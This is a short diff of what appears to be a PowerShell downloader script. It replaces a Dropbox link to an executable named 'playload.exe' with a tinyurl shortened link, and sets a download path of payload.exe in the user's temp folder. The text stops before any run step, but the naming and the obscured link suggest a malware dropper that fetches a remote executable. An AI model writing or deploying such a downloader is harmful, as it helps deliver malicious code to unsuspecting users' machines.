@@ -1,5 +1,5 @@
 # Set payload URL and download path
-$payloadUrl = "https://www.dropbox.com/scl/fi/2kod0sci09cgexv3i0aon/playload.exe?rlkey=s0ubz4gefsims5na5x8pvh5cb&st=685mcz4w&dl=0"  # <-- replace with your actual direct EXE link
+$payloadUrl = "https://tinyurl.com/5cexkpbw"  # <-- replace with your actual direct EXE link
 $payloadPath = "$env:TEMP\payload.exe"
 
 # Download the payload
